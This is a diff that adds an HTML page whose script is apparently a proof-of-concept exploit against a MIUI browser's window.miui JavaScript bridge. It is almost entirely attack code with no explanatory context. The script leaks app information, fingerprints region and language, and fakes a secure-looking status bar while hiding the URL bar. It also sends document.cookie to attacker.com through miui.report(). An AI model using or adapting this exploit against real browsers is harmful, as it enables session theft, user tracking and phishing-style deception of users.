@@ -1,2 +1,43 @@
-<a href=”example://browse/https://google.com”>click here</a>
+<!doctype html>
+<meta charset="utf-8">
+<script>
+(async function(){
+  function p(msg){ 
+    let d = document.createElement("pre"); 
+    d.textContent = msg; 
+    document.body.appendChild(d);
+  }
+
+  try {
+    if (typeof window.miui === 'object') {
+      // Leak app info
+      try {
+        let info = window.miui.getApplicationInfo();
+        p("[+] getApplicationInfo => " + JSON.stringify(info));
+      } catch(e){ p("[-] getApplicationInfo failed: " + e); }
+
+      // Fingerprint user region/language
+      try { p("[+] Region: " + window.miui.getRegion()); } catch(e){}
+      try { p("[+] Language: " + window.miui.getLanguage()); } catch(e){}
+
+      // Malicious UI trick
+      try {
+        window.miui.setStatusBarColor("#00FF00"); // Green fake secure indicator
+        window.miui.showUrlBar(false); // Hide real URL
+        p("[+] Modified UI -> Fake look like trusted page");
+      } catch(e){}
+
+      // Potential backend abuse
+      try {
+        window.miui.report("https://attacker.com/log?c=" + document.cookie);
+        p("[+] Sent sensitive data via miui.report()");
+      } catch(e){}
+    } else {
+      p("[-] miui not exposed");
+    }
+  } catch(e){
+    p("Exploit err: " + e);
+  }
+})();
+</script>
 
